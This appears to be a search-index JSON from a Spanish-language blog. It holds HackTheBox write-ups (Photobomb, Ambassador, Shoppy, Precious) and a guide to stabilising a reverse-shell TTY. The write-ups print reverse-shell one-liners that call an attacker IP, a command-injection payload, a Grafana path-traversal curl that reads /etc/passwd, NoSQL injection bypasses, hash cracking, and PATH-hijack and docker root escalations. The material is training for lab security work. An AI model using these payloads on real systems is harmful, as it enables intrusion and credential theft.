[
  
  {
    "title": "Photobomb WriteUp",
    "url": "/posts/photobomb-writeup/",
    "categories": "hackthebox, machine, writeup",
    "tags": "hackthebox, writeup, easy, command injection, path hijacking",
    "date": "2023-02-03 17:00:00 +0100",
    





    "snippet": "Hoy tocará explotar la máquina Photobomb de HackTheBox, es de dificultad fácil. Haremos un command injection y para la escalada haremos un Path HijackingEscaneo NMAPAntes de empezar les recomiendo hacer un escaneo para saber que puertos estan abiertos y que servicios corren por ellos, ya que esta información nos sera util para continuar con la prueba de penetración.❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.182 -oG allPortsHost discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-04 13:24 -04Initiating SYN Stealth Scan at 13:24Scanning 10.10.11.182 [65535 ports]Discovered open port 80/tcp on 10.10.11.182Discovered open port 22/tcp on 10.10.11.182Completed SYN Stealth Scan at 13:24, 17.92s elapsed (65535 total ports)Nmap scan report for 10.10.11.182Host is up, received user-set (0.16s latency).Scanned at 2023-02-04 13:24:12 -04 for 18sNot shown: 61907 closed tcp ports (reset), 3626 filtered tcp ports (no-response)Some closed ports may be reported as filtered due to --defeat-rst-ratelimitPORT   STATE SERVICE REASON22/tcp open  ssh     syn-ack ttl 6380/tcp open  http    syn-ack ttl 63Read data files from: /usr/bin/../share/nmapNmap done: 1 IP address (1 host up) scanned in 18.08 seconds           Raw packets sent: 87248 (3.839MB) | Rcvd: 67894 (2.716MB)Nos percatamos que tiene el SSH abierto y el puerto 80 que corresponde al HTTP, al entrar a la web no vemos nada, ya que se esta aplicando virtual hosting, para solucionarlo hacemos lo siguiente:echo \"10.10.11.182       photobomb.htb\" | tee -a /etc/hostsEnumeraciónVemos una pagina de inicio con un redirect a /printer Web SiteSi intentamos acceder nos pedirá credenciales Log inPodemos probar credenciales típicas por defecto, pero no resultará útil.admin:adminadmin:passwordadmin:passguest:guestSi revisamos el código fuente nos encontramos con cosaas interesantes.Le aplicamos un curl.❯ curl -s -X GET http://photobomb.htb&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;  &lt;title&gt;Photobomb&lt;/title&gt;  &lt;link type=\"text/css\" rel=\"stylesheet\" href=\"styles.css\" media=\"all\" /&gt;  &lt;script src=\"photobomb.js\"&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt;  &lt;div id=\"container\"&gt;    &lt;header&gt;      &lt;h1&gt;&lt;a href=\"/\"&gt;Photobomb&lt;/a&gt;&lt;/h1&gt;    &lt;/header&gt;    &lt;article&gt;      &lt;h2&gt;Welcome to your new Photobomb franchise!&lt;/h2&gt;      &lt;p&gt;You will soon be making an amazing income selling premium photographic gifts.&lt;/p&gt;      &lt;p&gt;This state of-the-art web application is your gateway to this fantastic new life. Your wish is its command.&lt;/p&gt;      &lt;p&gt;To get started, please &lt;a href=\"/printer\" class=\"creds\"&gt;click here!&lt;/a&gt; (the credentials are in your welcome pack).&lt;/p&gt;      &lt;p&gt;If you have any problems with your printer, please call our Technical Support team on 4 4283 77468377.&lt;/p&gt;    &lt;/article&gt;  &lt;/div&gt;&lt;/body&gt;&lt;/html&gt;Podemos ver un script de JavaScript, si vemos su contenido se nos filtra una cookie❯ curl -s -X GET http://photobomb.htb/photobomb.jsfunction init() {  // Jameson: pre-populate creds for tech support as they keep forgetting them and emailing me  if (document.cookie.match(/^(.*;)?\\s*isPhotoBombTechSupport\\s*=\\s*[^;]+(.*)?$/)) {    document.getElementsByClassName('creds')[0].setAttribute('href','http://pH0t0:b0Mb!@photobomb.htb/printer');  }}window.onload = init;Al copiar dicha cookie, podemos ver el panel /printer.Log inExplotaciónEn este apartado vemos unas imagenes las cuales podemos descargar y hacer pequeñas modificaciones como ser:  Cambiarle la extensión y modicar el tamaño.PrinterPodemos interceptar la petición con BurpSuite y ver mas a detalles como se estructura todoBurpSuitePodemos ver si es vulnerable a un Command injection, pero antes que nada inicia un servidor con pythonpython -m http.server 80Mandamos la petición al Repeater, para ello presionamos Ctrl + RSi nos fijamos en los parametros podemos agregar ; y añadir nuestro comando, se vería asíBurpSuitePodemos ver que no le gusta en algunos parametros, pero con haciendo prueba y error encontramos que el parametro filetype es vulnerable, lo podemos comprobar en la petición❯ python -m http.server 80Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...10.10.11.182 - - [04/Feb/2023 14:45:12] \"GET / HTTP/1.1\" 200 -Podemos intentar enviarnos una reverse shell, usano esta página podemos hacer la reverse shell con varias opciones.Probaremos con bash pero no funciona, así que podemos probar con python3 y esta nos lanzará la shellexport RHOST=\"10.10.14.25\";export RPORT=444;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"bash\")'RCE  Nota: Si usas nc mkfifo y url encode te lanzará la shell igualrm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Cbash%20-i%202%3E%261%7Cnc%2010.10.14.25%20444%20%3E%2Ftmp%2FfGanamos acceso a la máquina, estamos listos para rootearla❯ nc -lvnp 444listening on [any] 444 ...connect to [10.10.14.25] from (UNKNOWN) [10.10.11.182] 49946wizard@photobomb:~/photobomb$ Toca realizar un tratamiento a la tty, te puedes guiar de mi blog.Una vez adentro podemos leer la primera flagwizard@photobomb:~/photobomb$ cat ../user.txt 06****************************78wizard@photobomb:~/photobomb$ Escalada de privilegiosSi vemos los privilegios SUDOERS vemos que podemos ejecutar un programa hecho en bashwizard@photobomb:~/photobomb$ sudo -lMatching Defaults entries for wizard on photobomb:    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser wizard may run the following commands on photobomb:    (root) SETENV: NOPASSWD: /opt/cleanup.shwizard@photobomb:~/photobomb$ Vemos que lo podemos ejecutar sin proporcionar ninguna contraseña, es decir que al ejecuralo como sudo sera ejecutado de forma temporal como root sin proporcionar contraseñawizard@photobomb:~/photobomb$ sudo /opt/cleanup.sh wizard@photobomb:~/photobomb$ Si vemos el contenido de dicho archivo nos encontramos con binarios que podemos usar para elevar nuestros privilegios.wizard@photobomb:~/photobomb$ cat /opt/cleanup.sh #!/bin/bash. /opt/.bashrccd /home/wizard/photobomb# clean up log filesif [ -s log/photobomb.log ] &amp;&amp; ! [ -L log/photobomb.log ]then  /bin/cat log/photobomb.log &gt; log/photobomb.log.old  /usr/bin/truncate -s0 log/photobomb.logfi# protect the priceless originalsfind source_images -type f -name '*.jpg' -exec chown root:root {} \\;wizard@photobomb:~/photobomb$ Vemos que el binario find esta con ruta relativa no absoluta y esto puede derivar a un Path Hijacking,Podemos aprovechar que podemos cambiar variables de entorno como el Path para que nos ejecute el comando find personalizado, y bajo el contexto de sudo nuestro binario find lo ejecutará root.wizard@photobomb:/tmp$ echo bash &gt; findwizard@photobomb:/tmp$ chmod 777 find wizard@photobomb:/tmp$ sudo PATH=$PWD:$PATH /opt/cleanup.shwizard@photobomb:/tmp$ ls -l /bin/bashroot@photobomb:/home/wizard/photobomb# Ya rooteamos la máquina, lo que hicimos fue hacer un binario perzonalizado find que nos lanze una bash como root, en este caso, ya que el esta ejecutando el /opt/cleanup.sh con el binario find de forma relativa.Procedemos a leer la flagroot@photobomb:/home/wizard/photobomb# cat /root/root.txt 74****************************35root@photobomb:/home/wizard/photobomb# ¡¡¡Máquina Pwneada!!! Te deseo un Feliz Hackeo."
  },
  
  {
    "title": "Precious WriteUp",
    "url": "/posts/precious-writeup/",
    "categories": "hackthebox, machine, writeup",
    "tags": "hackthebox, writeup, rce",
    "date": "2023-01-16 17:00:00 +0100",
    





    "snippet": "Les explicaré comó comprometer la máquina Precious de HackTheBox. En esta máquina nos enfretaremos a una versión vulnerable de pdfkit con la cual ganaremos acceso por una reverse shell y para la escalada cargaremos un archivo para convertir la BASH en SUID."
  },
  
  {
    "title": "Ambassador WriteUp",
    "url": "/posts/ambassador-writeup/",
    "categories": "hackthebox, machine, writeup",
    "tags": "hackthebox, writeup, grafana, directoty transversal, arbitrary file read",
    "date": "2023-01-16 17:00:00 +0100",
    





    "snippet": "Les explicare como comprometer la máquina Ambassador de HackTheBox, Nos enfrentaremos a una version de Grafana la cual cuenta con una vulnerabilidad de tipo Directory Transversal y Arbitrary File Read. Para ganar acceso al sistema nos aprovecharemos de aquella vulneravilidad de grafana que nos aprovecharemos de en exploit de Consul con un token que nos lanzará la shell como root.Escaneo NMAPEmpezamos enumerando con NMAP, con ello encontaremos los puertos abiertos y los servicios que se exponen.❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.183 -oG allPortsHost discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-21 00:03 -04Initiating SYN Stealth Scan at 00:03Scanning 10.10.11.183 [65535 ports]Discovered open port 80/tcp on 10.10.11.183Discovered open port 3306/tcp on 10.10.11.183Discovered open port 22/tcp on 10.10.11.183Discovered open port 3000/tcp on 10.10.11.183Completed SYN Stealth Scan at 00:03, 17.01s elapsed (65535 total ports)Nmap scan report for 10.10.11.183Host is up, received user-set (0.32s latency).Scanned at 2023-01-21 00:03:39 -04 for 17sNot shown: 61030 closed tcp ports (reset), 4501 filtered tcp ports (no-response)Some closed ports may be reported as filtered due to --defeat-rst-ratelimitPORT     STATE SERVICE REASON22/tcp   open  ssh     syn-ack ttl 6380/tcp   open  http    syn-ack ttl 633000/tcp open  ppp     syn-ack ttl 633306/tcp open  mysql   syn-ack ttl 63Read data files from: /usr/bin/../share/nmapNmap done: 1 IP address (1 host up) scanned in 17.22 seconds           Raw packets sent: 82990 (3.652MB) | Rcvd: 66979 (2.679MB)Puerto 22 su servicio por defecto es SSH, 80 este puerto en su configuración por defecto corre el servicio HTTP, MySQL corre en el puerto 3306 y el puerto 3000 fue asignado por el administradorEnumeraciónPodemos realizar FUZZING para ver si encontramos ninggun directorio, pero esto resultaría inutíl ya que no encontraremos nada, en su lugar podemos usar el puerto que encontramos y tratar de acceder a él.Viendo la web nos encontramos con esto:Grafana LoginViendo en la parte inferior nos da información acerca de la versión, usando searchsploit nos damos cuenta de que cuenta con estas vulnerabilidades Directory Traversal and Arbitrary File ReadSearchsploitPodemos copiar el script de Python en nuestra carpeta de trabajo e intentamos leer el /etc/passwd❯ searchsploit -m multiple/webapps/50581.py  Exploit: Grafana 8.3.0 - Directory Traversal and Arbitrary File Read      URL: https://www.exploit-db.com/exploits/50581     Path: /snap/searchsploit/62/opt/exploitdb/exploits/multiple/webapps/50581.py    Codes: CVE-2021-43798 Verified: FalseFile Type: Python script, ASCII text executableCopied to: /home/h4ckerlite/Desktop/h4ckerlite/HTB/Máquinas/Ambassador/nmap/50581.pyLo ejecutamos…SearchsploitBuscando en internet acerca de este CVE nos encontramos con este blog, nos enseñan a explotarlo de forma manual.❯ curl --path-as-is http://10.10.11.183:3000/public/plugins/alertlist/../../../../../../../../etc/passwd | grep sh$root:x:0:0:root:/root:/bin/bashdeveloper:x:1000:1000:developer:/home/developer:/bin/bashSi seguimos leyendo podemos ver que nos podemos descargar la base de datos curl --path-as-is http://10.10.11.183:3000/public/plugins/alertlist/../../../../../../../../var/lib/grafana/grafana.db -o grafana.dbAhora procedemos a leer la base de datos, para ello debes tener instalado sqlite3 para verlo desde consola, ya que lo considero mas fácil.  sudo apt install sqlite3Sigueindo las instrucciones del blog leemos la base de datos. sqlite3 grafana.bdUna vez detro de la base de datos, procedemos a leer las tablas ❯ sqlite3 grafana.dbSQLite version 3.34.1 2021-01-20 14:10:07Enter \".help\" for usage hints.sqlite&gt; .tablesalert                       login_attempt             alert_configuration         migration_log             alert_instance              ngalert_configuration     alert_notification          org                       alert_notification_state    org_user                  alert_rule                  playlist                  alert_rule_tag              playlist_item             alert_rule_version          plugin_setting            annotation                  preferences               annotation_tag              quota                     api_key                     server_lock               cache_data                  session                   dashboard                   short_url                 dashboard_acl               star                      dashboard_provisioning      tag                       dashboard_snapshot          team                      dashboard_tag               team_member               dashboard_version           temp_user                 data_source                 test_data                 kv_store                    user                      library_element             user_auth                 library_element_connection  user_auth_token           sqlite&gt; Usando una query de SQL, leeremos las columnas de la tabla data_source.select * from data_source;Veremos algo cómo esto.sqlite&gt; SELECT * FROM data_source;2|1|1|mysql|mysql.yaml|proxy||dontStandSoCloseToMe63221!|grafana|grafana|0|||0|{}|2022-09-01 22:43:03|2023-01-20 21:54:47|0|{}|1|uKewFgM4zsqlite&gt; Ganamos accesoDonde el parámetro -h corresponde al host -u  al user -p a la contraseñaAhora nos podemos conectar a MySQL debido a que conocemos el user y su contraseña.❯ mysql -h10.10.11.183 -ugrafana -pdontStandSoCloseToMe63221!Welcome to the MariaDB monitor.  Commands end with ; or \\g.Your MySQL connection id is 47Server version: 8.0.30-0ubuntu0.20.04.2 (Ubuntu)Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.Type 'help;' or '\\h' for help. Type '\\c' to clear the current input statement.MySQL [(none)]&gt; show databases;+--------------------+| Database           |+--------------------+| grafana            || information_schema || mysql              || performance_schema || sys                || whackywidget       |+--------------------+6 rows in set (0,172 sec)MySQL [(none)]&gt; use whackywidget;Reading table information for completion of table and column namesYou can turn off this feature to get a quicker startup with -ADatabase changedMySQL [whackywidget]&gt; show tables;+------------------------+| Tables_in_whackywidget |+------------------------+| users                  |+------------------------+1 row in set (0,396 sec)MySQL [whackywidget]&gt; SELECT * FROM users;+-----------+------------------------------------------+| user      | pass                                     |+-----------+------------------------------------------+| developer | YW5FbmdsaXNoTWFuSW5OZXdZb3JrMDI3NDY4Cg== |+-----------+------------------------------------------+1 row in set (0,375 sec)MySQL [whackywidget]&gt; Vemos una contraseña, esta se encuentra cifrada en Base64, podemos decifrarla de la siguiente manera.echo \"YW5FbmdsaXNoTWFuSW5OZXdZb3JrMDI3NDY4Cg==\" | base64 -d;echo anEnglishManInNewYork027468Con esas credenciales podemos conectarnos por SSH.❯ ssh developer@10.10.11.183The authenticity of host '10.10.11.183 (10.10.11.183)' can't be established.ECDSA key fingerprint is SHA256:+BgUV7q/7f6W3/1eQWhIKW2f8xTcBh3IM0VwbIAp2A8.Are you sure you want to continue connecting (yes/no/[fingerprint])? yesWarning: Permanently added '10.10.11.183' (ECDSA) to the list of known hosts.developer@10.10.11.183's password: anEnglishManInNewYork027468 Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-126-generic x86_64) * Documentation:  https://help.ubuntu.com * Management:     https://landscape.canonical.com * Support:        https://ubuntu.com/advantage  System information as of Sat 21 Jan 2023 05:10:23 AM UTC  System load:  0.0               Processes:             229  Usage of /:   84.4% of 5.07GB   Users logged in:       0  Memory usage: 49%               IPv4 address for eth0: 10.10.11.183  Swap usage:   0%0 updates can be applied immediately.The list of available updates is more than a week old.To check for new updates run: sudo apt updateFailed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settingsLast login: Sat Jan 21 00:27:29 2023 from 10.10.14.105developer@ambassador:~$ export TERM=xtermdeveloper@ambassador:~$ Podemos leer la primara flag.developer@ambassador:~$ cat user.txt 565**************************1b5developer@ambassador:~$ Enumeración del sistemaEn la carpeta home buscamos por carpetas/archivos ocultos y encontramos un archivo de configuración de github.developer@ambassador:~$ ls -a.  ..  .bash_history  .bash_logout  .bashrc  .cache.gitconfig  .gnupg  .lesshst  .local  .profile  .ssh  snap  user.txtdeveloper@ambassador:~$ Si lo leemos nos dice la ruta donde se encuentra.developer@ambassador:~$ cat .gitconfig [user]    name = Developer    email = developer@ambassador.local[safe]    directory = /opt/my-appdeveloper@ambassador:~$ Si nos situamos en la carpeta /opt podemos ver el proyecto github.developer@ambassador:/opt/my-app$ ls -a.  ..  .git  .gitignore  env  whackywidgetdeveloper@ambassador:/opt/my-app$ Si hacemos un git -log podemos ver los últimos commits que se aplicarondeveloper@ambassador:/opt/my-app$ git logcommit 33a53ef9a207976d5ceceddc41a199558843bf3c (HEAD -&gt; main)Author: Developer &lt;developer@ambassador.local&gt;Date:   Sun Mar 13 23:47:36 2022 +0000    tidy config scriptcommit c982db8eff6f10f8f3a7d802f79f2705e7a21b55Author: Developer &lt;developer@ambassador.local&gt;Date:   Sun Mar 13 23:44:45 2022 +0000    config scriptcommit 8dce6570187fd1dcfb127f51f147cd1ca8dc01c6Author: Developer &lt;developer@ambassador.local&gt;Date:   Sun Mar 13 22:47:01 2022 +0000    created project with django CLIcommit 4b8597b167b2fbf8ec35f992224e612bf28d9e51Author: Developer &lt;developer@ambassador.local&gt;Date:   Sun Mar 13 22:44:11 2022 +0000    .gitignoredeveloper@ambassador:/opt/my-app$ Ahora haciendo un git show se nos mostrará información acerca de ese commit.developer@ambassador:/opt/my-app$ git showcommit 33a53ef9a207976d5ceceddc41a199558843bf3c (HEAD -&gt; main)Author: Developer &lt;developer@ambassador.local&gt;Date:   Sun Mar 13 23:47:36 2022 +0000    tidy config scriptdiff --git a/whackywidget/put-config-in-consul.sh b/whackywidget/put-config-in-consul.shindex 35c08f6..fc51ec0 100755--- a/whackywidget/put-config-in-consul.sh+++ b/whackywidget/put-config-in-consul.sh@@ -1,4 +1,4 @@ # We use Consul for application config in production, this script will help set the correct values for the app-# Export MYSQL_PASSWORD before running+# Export MYSQL_PASSWORD and CONSUL_HTTP_TOKEN before running -consul kv put --token bb03b43b-1d81-d62b-24b5-39540ee469b5 whackywidget/db/mysql_pw $MYSQL_PASSWORD+consul kv put whackywidget/db/mysql_pw $MYSQL_PASSWORDdeveloper@ambassador:/opt/my-app$ Ahora con una busqueda en Google encontramos una vía potencial de escalar nuestros privilegios.Escalada de privilegiosUsando el exploit de GatoGamer podemos elevar nuestros privilegios, nos descargamos el repositorio de GitHub**, nos montamos un servidor **HTTP con Pythonpython -m http.server 80En la máquina víctima lo descargamos, y lo ejecutamos, debemos estar en la carpeta personal para poder descargarlo.developer@ambassador:~$ wget http://10.10.14.61/exploit.py--2023-01-21 05:40:22--  http://10.10.14.61/exploit.pyConnecting to 10.10.14.61:80... connected.HTTP request sent, awaiting response... 200 OKLength: 1409 (1.4K) [text/x-python]Saving to: ‘exploit.py.1’exploit.py.1                                  100%[=================================================================================================&gt;]   1.38K  --.-KB/s    in 0s      2023-01-21 05:40:22 (95.1 MB/s) - ‘exploit.py.1’ saved [1409/1409]developer@ambassador:~$ En la máquina víctima ejecutamos lo siguiente.Nota: Recuerda cambiar tu IP de HTBEn nuestra máquina host nos ponemos en escuchadeveloper@ambassador:~$ python3 exploit.py --lhost 10.10.14.61 --lport 123 --token bb03b43b-1d81-d62b-24b5-39540ee469b5 ❯ nc -nlvp 123listening on [any] 123 ...Al ejecutarlo nos debe llegar la shell como root❯ nc -nlvp 123listening on [any] 123 ...connect to [10.10.14.61] from (UNKNOWN) [10.10.11.183] 58732bash: cannot set terminal process group (3731): Inappropriate ioctl for devicebash: no job control in this shellroot@ambassador:/# Ahora podemos vizualizar la flag como rootroot@ambassador:~# lscleanup.sh  root.txt  snaproot@ambassador:~# cat root.txt 5a4**************************4b1root@ambassador:~# "
  },
  
  {
    "title": "Shoppy WriteUp",
    "url": "/posts/shoppy-writeup/",
    "categories": "hackthebox, machine, writeup",
    "tags": "hackthebox, writeup, no sql",
    "date": "2023-01-13 17:00:00 +0100",
    





    "snippet": "Les explicaré comó comprometer la máquina Shoppy de HackTheBox. En esta máquina nos enfretaremos a un NoSQLi de MongoDB y ganaremos acceso al sistema gracias a una contraseña filtrada y para la escalada nos vamos a aprovechar del grupo Docker.Escaneo NMAPAntes de empezar les recomiendo hacer un escaneo para saber que puertos estan abiertos y que servicios corren por ellos, ya que esta información nos sera util para continuar con la prueba de penetración.❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.180 -oG allPortsHost discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-15 11:59 -04Initiating SYN Stealth Scan at 11:59Scanning 10.10.11.180 [65535 ports]Discovered open port 80/tcp on 10.10.11.180Discovered open port 22/tcp on 10.10.11.180Discovered open port 9093/tcp on 10.10.11.180Completed SYN Stealth Scan at 12:00, 15.14s elapsed (65535 total ports)Nmap scan report for 10.10.11.180Host is up, received user-set (0.16s latency).Scanned at 2023-01-15 11:59:53 -04 for 16sNot shown: 65368 closed tcp ports (reset), 164 filtered tcp ports (no-response)Some closed ports may be reported as filtered due to --defeat-rst-ratelimitPORT     STATE SERVICE REASON22/tcp   open  ssh     syn-ack ttl 6380/tcp   open  http    syn-ack ttl 639093/tcp open  copycat syn-ack ttl 63Read data files from: /usr/bin/../share/nmapNmap done: 1 IP address (1 host up) scanned in 15.33 seconds           Raw packets sent: 74269 (3.268MB) | Rcvd: 73540 (2.942MB)Nos percatamos que tiene el SSH abierto y el puerto 80 que corresponde al HTTP, al entrar a la web no vemos nada, ya que se esta aplicando virtual hosting, para solucionarlo hacemos lo siguiente:echo \"10.10.11.180       shoppy.htb\" | tee -a /etc/hostsAhora debemos ver una web con una cuenta regresiva, nada importanteEnumeraciónEnumerando directorios con WFUZZ nos encontramos lo siguiente.Nota: Debes tener clonado el repositorio de SecList❯ wfuzz -c --hc=404 -t 50 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt http://shoppy.htb/FUZZ  2&gt;/dev/null********************************************************* Wfuzz 3.1.0 - The Web Fuzzer                         *********************************************************Target: http://shoppy.htb/FUZZTotal requests: 220560=====================================================================ID           Response   Lines    Word       Chars       Payload                                                                                                                =====================================================================000000053:   200        25 L     62 W       1074 Ch     \"login\"                                                                                                                000000016:   301        10 L     16 W       179 Ch      \"images\"                                                                                                               000000291:   301        10 L     16 W       179 Ch      \"assets\"                                                                                                               000000259:   302        0 L      4 W        28 Ch       \"admin\"   Nos encontramos con /login , intentamos acceder pero esta protegido por un login, podemos probar con una injección SQL y ver si es vulnerable a este tipo de ataque.Login ShoppyIntroducimos una comilla al final del usuario para ver si la query de la consulta es vulnerable a SQL injection, notamos que el servidor se demora en responder, por lo que confirmamos que es vulnerble.Login ShoppyPodemos seguir probando tipicas SQL injection, pero al final ninguna funcionará.''-- -' or '1'='1' or '1'='1'-- -Pero vemos que ninguna funciona, eso nos da una pista que debemos probar con una injección NoSQL, una base de las bases de datos mas usadas son MongoDB, buscando payloads en Google encontramos estos blogs MongoDB SQL injection y  este otro blog No SQl injection.Podemos probar admin'||'1==1 y poner cualquier contraseña:Bypass LoginBingo!!! Ganamos acceso como administrador, en el buscador podemos repetir la injección.Nos sale una opción para descargar un archivo JSON, cuando vemos el archivo vemos 2 usuarios y sus respectivos hashes. Creamos un archivo con los hashes y lo intentaremos crakear con johnecho \"admin:23c6877d9e2b564ef8b32c3a23de27b2\" &gt; hashesecho \"josh:6ebcea65320589ca4f2f1ce039975995\" &gt;&gt; hashes❯ john -w:/usr/share/wordlists/rockyou.txt hashes --format=Raw-MD5Using default input encoding: UTF-8Loaded 2 password hashes with no different salts (Raw-MD5 [MD5 256/256 AVX2 8x3])Warning: no OpenMP support for this hash type, consider --fork=8Press 'q' or Ctrl-C to abort, almost any other key for statusremembermethisway (josh)1g 0:00:00:02 DONE (2023-01-15 12:44) 0.4444g/s 6374Kp/s 6374Kc/s 6735KC/s  fuckyooh21..*7¡Vamos!Use the \"--show --format=Raw-MD5\" options to display all of the cracked passwords reliablySession completedTenemos una contraseña, podemos buscar por subdominios a ver que nos encontramos❯ gobuster vhost  -w /usr/share/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://shoppy.htb/ -t 200===============================================================Gobuster v3.1.0by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)===============================================================[+] Url:          http://shoppy.htb/[+] Method:       GET[+] Threads:      200[+] Wordlist:     /usr/share/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt[+] User Agent:   gobuster/3.1.0[+] Timeout:      10s===============================================================2023/01/15 12:48:41 Starting gobuster in VHOST enumeration mode===============================================================Found: mattermost.shoppy.htb (Status: 200) [Size: 3122]Progress: 52985 / 100001 (52.98%)    Tenemos un subdominio, la misma historia lo añadimos en el /etc/hosts.Al entrar en el web nos encontramos con estoLogin MattermostViendo las conversaciones nos dan un usuario y sus credenciales para el SSH, nos conectamos.Information leaked❯ ssh jaeger@10.10.11.180jaeger@10.10.11.180's password: Sh0ppyBest@pp!Linux shoppy 5.10.0-18-amd64 #1 SMP Debian 5.10.140-1 (2022-09-02) x86_64The programs included with the Debian GNU/Linux system are free software;the exact distribution terms for each program are described in theindividual files in /usr/share/doc/*/copyright.Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extentpermitted by applicable law.Last login: Sun Jan 15 11:02:26 2023 from 10.10.14.26manpath: can't set the locale; make sure $LC_* and $LANG are correctjaeger@shoppy:~$ export TERM=xtermjaeger@shoppy:~$ Una vez dentro podemos ver si tenemos algún privilegio asignado a sudo, vemos que podemos ejecutar como el usuario deploy un ejecutable.Enumeración del sistemajaeger@shoppy:~$ sudo -l[sudo] password for jaeger: Sh0ppyBest@pp!Matching Defaults entries for jaeger on shoppy:    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/binUser jaeger may run the following commands on shoppy:    (deploy) /home/deploy/password-managerjaeger@shoppy:~$ Intentamos ejecutar el comandojaeger@shoppy:~$ sudo -u deploy /home/deploy/passw*Welcome to Josh password manager!Please enter your master password: PasswordAccess denied! This incident will be reported !jaeger@shoppy:~$ La contraseña no es correcta, jugando con XXD podemos ver que la contraseña se filtra, bingo ya descubrimos la contraseña, ahora lo ejecutamos como el usuario deployPassword-Managerjaeger@shoppy:~$ sudo -u deploy /home/deploy/password-managerWelcome to Josh password manager!Please enter your master password: SampleAccess granted! Here is creds !Deploy Creds :username: deploypassword: Deploying@pp!jaeger@shoppy:~$ Podemos migrar al usuario Deploy .jaeger@shoppy:~$ su deployPassword: Deploying@pp!$ bashdeploy@shoppy:/home/jaeger$ deploy@shoppy:/home/jaeger$ iduid=1001(deploy) gid=1001(deploy) groups=1001(deploy),998(docker)deploy@shoppy:/home/jaeger$ Escalada de privilegiosPertenecemos al grupo docker  mirando GtfObins podemos ver que podemos abusar del grupo dockerEjecutamos el comando nos da una shell como root. deploy@shoppy:/home/jaeger$ docker run -v /:/mnt --rm -it alpine chroot /mnt bashroot@3ea87a82734f:/# Ganamos acceso root, ya rooteamos la máquina ahora podemos leer las  flags respectivas para cada usuario.root@3ea87a82734f:~# cat root.txt 3d4c1a0477********************66root@3ea87a82734f:~# cat /home/jaeger/user.txt 3d97fe0060********************67root@3ea87a82734f:~# "
  },
  
  {
    "title": "Tratamiento de la TTY",
    "url": "/posts/tty/",
    "categories": "pentesting, machines",
    "tags": "tty",
    "date": "2022-02-03 17:00:00 +0100",
    





    "snippet": "Una vez que ganamos acceso a un servidor por medio de una reverse shell no será interactiva al 100%, para solucionar estó debemos aplicar un tratamiento a la TTY, al aplicar este tratamiento podemos hacer Ctrl + C sin miedo a perder la Shell y tambien limpiar la pantalla y tabular para el autocompletado.Tratamientoroot@f5fd61010b2d:~$ script /dev/null -c bashscript /dev/null -c bashScript started, file is /dev/nullroot@f5fd61010b2d:~$ Presionamos Ctrl + Z para suspender la shellroot@f5fd61010b2d:~$ ^Zzsh: suspended  nc -lvnp 444Reiniciamos la shell y configuramos el tipo de terminal❯ stty raw -echo; fg❯ stty raw -echo; fg[1]  + continued  nc -lvnp 444                              reset xtermYa podemos aplicar Ctrl + C y no perderemos la conexión, pero el Ctrl + L no funciona, para ello cambiamos la variable de entorno TERM a xtermroot@f5fd61010b2d:~$ export TERM=xtermA veces la variable SHELL vale nologin, hacemos lo siguiente para que sea una shellroot@f5fd61010b2d:~$ export SHELL=/bin/bashYa tenemos una consola semi-interactiva, para que sea full-interactiva debemos cambiar las filas y columnas, en la mæquina victima hacemos un:root@f5fd61010b2d:~$ stty size24 80root@f5fd61010b2d:~$ Y en nuestra máquina hacemos lo mismo y confirmamos que los valores no coinciden.❯ stty size48 184Regresamos a la máquina victima y cambiamos los valoresroot@f5fd61010b2d:~$ stty rows 48 columns 184        root@f5fd61010b2d:~$ Una vez hecho esto nuestra TTY ya sera 100% interactiva."
  }
  
]

